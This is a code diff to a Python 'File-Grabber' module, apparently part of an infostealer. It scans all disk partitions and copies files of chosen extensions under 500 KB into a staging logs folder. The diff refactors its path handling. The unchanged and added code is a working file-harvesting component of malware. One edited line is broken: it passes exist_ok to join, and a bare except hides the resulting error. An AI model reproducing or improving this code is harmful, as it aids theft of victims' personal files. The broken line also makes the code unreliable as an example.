@@ -1,12 +1,12 @@
 from os import environ,chdir,makedirs
 from psutil import disk_partitions
 from pathlib import Path
-from os.path import getsize
+from os.path import getsize, join
 from shutil import copy2
 from manager.logger import Log
 from preferences.config import config
 
-def Copy(fileList, user, extension, count):
+def Copy(fileList, extension, count):
     extension = extension[4:]
     for i in range (len(fileList)):
         count+=1
@@ -15,11 +15,11 @@ def Copy(fileList, user, extension, count):
             fname = fileList[i][num+1:]
             size = getsize(fileList[i])
             try:
-                makedirs(f'{user}\\{config.pathToLogs}\\Files\\File-Grabber\\{extension[1:]}', exist_ok=True)
+                makedirs(join(config.pathToLogs, "Files", "File-Grabber", extension[1:]), exist_ok=True)
             except:
                 pass
             if size < 500000:
-                copy2(fileList[i],f'{user}\\{config.pathToLogs}\\Files\\File-Grabber\\{extension[1:]}\\{fname[:-len(extension)]}___{count}{extension}')
+                copy2(fileList[i], join(config.pathToLogs, "Files", "File-Grabber", extension[1:], f"{fname[:-len(extension)]}___{count}{extension}"))
         except Exception as e:
             Log(f"{fname[:-len(extension)]}___{count}{extension} --> {e}")
     return count
@@ -28,9 +28,8 @@ def Grab():
     msgInfo = ""
     chdir("C:")
     try:
-        user = environ['USERPROFILE']
         try:
-            makedirs(f'{user}\\{config.pathToLogs}\\Files\\File-Grabber', exist_ok=True)
+            makedirs(join(config.pathToLogs, "Files", "File-Grabber", exist_ok=True))
         except:
             pass
         try:
@@ -55,7 +54,7 @@ def Grab():
                         except Exception as e:
                             Log(drive+" search "+e)
                         try:
-                            filesGrab[i][1]= Copy(pathes,user,filesGrab[i][0],filesGrab[i][1])
+                            filesGrab[i][1]= Copy(pathes,filesGrab[i][0],filesGrab[i][1])
                         except Exception as e:
                             Log(drive+" copy "+e)
             for i in range(len(filesGrab)):
